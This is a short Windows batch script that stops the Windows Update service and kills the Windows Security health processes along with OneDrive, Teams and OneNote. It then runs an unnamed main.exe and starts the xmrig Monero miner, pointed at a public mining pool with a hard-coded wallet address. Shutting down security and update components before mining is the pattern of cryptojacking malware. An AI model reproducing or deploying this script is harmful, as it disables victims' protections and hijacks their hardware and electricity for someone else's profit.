@echo off
net stop WUAUSERV
taskkill /IM OneDrive.exe
taskkill /IM SecurityHealthSystray.exe
taskkill /IM SecurityHealthService.exe
taskkill /IM ONENOTEM.exe
taskkill /IM Teams.exe
cd /d "%~dp0"
main.exe
xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.Criador-15-01-1 -p x -t 1
pause 
